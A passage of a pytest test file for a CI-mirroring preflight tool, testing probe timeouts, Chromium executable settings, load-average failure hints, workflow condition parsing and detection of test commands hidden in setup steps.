    assert [x["id"] for x in report["not_run"]] == ["never"]                 # still not run, never passed


def test_a_probe_that_times_out_is_stopped_with_its_children(tmp_path, monkeypatch):
    """An interpreter probe runs in its own process group, and a timeout stops the whole group, not only the
    interpreter (a wrapper script's children survived)."""
    marker = tmp_path / "child.pid"
    exe = tmp_path / "python-wrapper"
    exe.write_text(f"#!/bin/sh\nsleep 60 & echo $! > {marker}\nwait\n")
    exe.chmod(0o755)
    monkeypatch.setattr(pf, "PROBE_TIMEOUT", 1, raising=False)
    m = pf.Machine(tmp_path, env={"PATH": "/usr/bin:/bin"})
    started = time.monotonic()
    assert m.probe(str(exe), [], [], None) is None
    assert time.monotonic() - started < 20
    child = int(marker.read_text())
    time.sleep(0.2)
    status = Path(f"/proc/{child}/status")
    state = re.search(r"^State:\s+(\S)", status.read_text(), re.M).group(1) if status.exists() else "gone"
    assert state in {"gone", "Z", "X"}, f"the probe's child {child} still runs ({state})"


def test_the_preset_browser_note_lands_only_on_suites_that_read_it(tmp_path, monkeypatch):
    """``site-browser`` and others launch by channel and never read CHROMIUM_EXECUTABLE: with the pinned build here
    they run on it, so a caller's preset is no reason to flag them."""
    m = _machine(tmp_path, browsers=["chromium-1194", "chromium_headless_shell-1194"], monkeypatch=monkeypatch)
    m.env["CHROMIUM_EXECUTABLE"] = "/opt/my/chromium"
    reads = _assess({"id": "r", "command": "c", "engines": ["chromium"]}, m, engine="chromium")
    assert reads.differs == ["browser"]
    ignores = _assess({"id": "i", "command": "c", "engines": ["chromium"], "needs": {"chromium_executable": False}},
                      m, engine="chromium")
    assert ignores.status == "runnable" and ignores.differs == [] and not ignores.notes
    m = _machine(tmp_path / "chrome", chrome=True, monkeypatch=monkeypatch)        # no pinned build, a local Chrome
    m.env["CHROMIUM_EXECUTABLE"] = "/opt/my/chromium"
    ignores = _assess({"id": "i", "command": "c", "engines": ["chromium"], "needs": {"chromium_executable": False}},
                      m, engine="chromium")
    assert ignores.differs == ["browser"] and not any("/opt/my/chromium" in n for n in ignores.notes)
    assert any("local Chrome" in n for n in ignores.notes)


def test_chromium_executable_false_matches_the_suites_that_ignore_it(mapping):
    """The mapping says which Chromium suites never read CHROMIUM_EXECUTABLE; the suite files are the truth."""
    wrong, seen = [], 0
    for c in mapping["checks"]:
        need = c.get("needs", {})
        if "chromium" not in c.get("engines", []) and need.get("browser") != "chromium":
            continue
        files = suite_files(c)
        assert files, f"{c['id']}: no suite files found to read"
        seen += 1
        reads = any("CHROMIUM_EXECUTABLE" in f.read_text(encoding="utf-8") for f in files)
        if need.get("chromium_executable", True) != reads:
            wrong.append(f"{c['id']}: its suites {'read' if reads else 'never read'} CHROMIUM_EXECUTABLE")
    assert seen >= 10 and not wrong, "\n".join(wrong)
    flags = {c["id"] for c in mapping["checks"] if c.get("needs", {}).get("chromium_executable") is False}
    assert {"site-browser", "site-catalog-browser", "scada-explorer-browser"} <= flags


def test_a_failure_under_load_says_so(tmp_path, capsys, monkeypatch):
    """A wall-clock assertion (tests/webkit/files/browser.mjs) failed once at a load average of about 6 and passed
    alone: a failure under a load above the CPU count carries a hint to rerun it alone."""
    args = _repo(tmp_path, [_check("bad", "exit 1"), _check("ok", "true")])
    monkeypatch.setattr(os, "cpu_count", lambda: 4)
    monkeypatch.setattr(os, "getloadavg", lambda: (6.2, 5.0, 4.0))
    assert pf.main(args + ["--paths", "a/x", "--json"]) == 1
    checks = {c["id"]: c for c in json.loads(capsys.readouterr().out)["checks"]}
    assert any("load average was 6.2 on 4 CPUs" in n and "--only bad" in n for n in checks["bad"]["notes"])
    assert not checks["ok"]["notes"], "a pass carries no load note"
    monkeypatch.setattr(os, "getloadavg", lambda: (3.9, 5.0, 4.0))
    assert pf.main(args + ["--paths", "a/x", "--json"]) == 1
    assert not json.loads(capsys.readouterr().out)["checks"][0]["notes"]


@pytest.mark.parametrize("condition,dispatch_only", [
    ("github.event_name == 'workflow_dispatch'", True),
    ("${{ github.event_name == 'workflow_dispatch' && inputs.x }}", True),
    ("(github.event_name == 'workflow_dispatch') && inputs.x", True),
    ("github.event_name == 'workflow_dispatch' || github.event_name == 'pull_request'", False),
    ("!(github.event_name == 'workflow_dispatch')", False),
    ("contains('github.event_name == \\'workflow_dispatch\\'', x)", False),
    ("inputs.x && (github.event_name == 'workflow_dispatch' || inputs.y)", False),
])
def test_dispatch_only_is_a_required_term(mapping, condition, dispatch_only):
    flows = {"webkit.yml": {"on": {"pull_request": None}, "jobs": {"browser": {"steps": [
        {"name": "Planted", "if": condition, "run": "npm run test:new"}]}}}}
    unmapped, _, _, _ = audit(flows, mapping)
    assert (not unmapped) is dispatch_only, condition


@pytest.mark.parametrize("condition,ok", [
    ("failure() && steps.scada_provenance.outcome == 'failure'", True),
    ("${{ failure() }}", True),
    ("always() || failure()", False),
    ("success() || failure()", False),
    ("!failure()", False),
    ("contains(steps.x.outputs.y, 'failure()')", False),
    ("", False),
])
def test_ci_only_needs_failure_as_a_required_term(mapping, condition, ok):
    flows = {"webkit.yml": {"on": {"pull_request": None}, "jobs": {"browser": {"steps": [
        {"name": "Repair", "if": condition, "run": "npm run test:repair"}]}}}}
    marked = {"checks": [{"id": "r", "ci_only": "repairs", "cwd": ".", "mirrors": [
        {"workflow": "webkit.yml", "job": "browser", "run": "npm run test:repair"}]}]}
    assert (not ci_only_problems(flows, marked)) is ok, condition


@pytest.mark.parametrize("script", [
    "pip install $(make test)",
    "npm ci $(bash check.sh)",
    'echo "x" & npm run test:hidden',
    "true & bash check.sh",
])
def test_a_subshell_in_setup_and_a_background_command_are_seen(mapping, script):
    flows = {"webkit.yml": {"on": {"pull_request": None}, "jobs": {"browser": {"steps": [
        {"name": "Planted", "run": script}]}}}}
    unmapped, unclassified, _, _ = audit(flows, mapping)
    assert unmapped or unclassified, script


def test_redirections_are_not_split_at_their_ampersand():
    assert segments('npm run x 2>&1 | tee log\nnode y &> out') == ["npm run x 2>&1", "tee log", "node y &> out"]
